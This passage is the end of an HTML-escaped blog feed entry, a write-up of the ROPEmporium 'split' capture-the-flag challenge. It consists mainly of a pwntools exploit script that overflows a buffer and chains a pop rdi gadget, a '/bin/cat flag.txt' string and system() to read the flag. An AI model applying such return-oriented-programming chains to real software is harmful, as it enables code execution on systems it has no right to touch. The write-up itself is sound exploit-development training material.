        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Connect to the process on the remote host'''&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Start the exploit against the target.'''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LOCAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''
break *0x{exe.symbols.main:x}
continue
'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;locals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# -- Exploit goes here --
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#Controlling RIP Register
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usefulString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usefulString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#/bin/cat flag.txt
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#Creating the system call
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400883&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#Putting the string onto RDI
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usefulString&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Flag: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-1-split/image-13.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;GitHub: &lt;a href=&quot;https://github.com/Securitybits-io/ROPEmporium&quot;&gt;https://github.com/Securitybits-io/ROPEmporium&lt;/a&gt;&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="exploit-dev" /><summary type="html">Doing a ROPEmporium Series, time to switch it up with Split!</summary></entry></feed>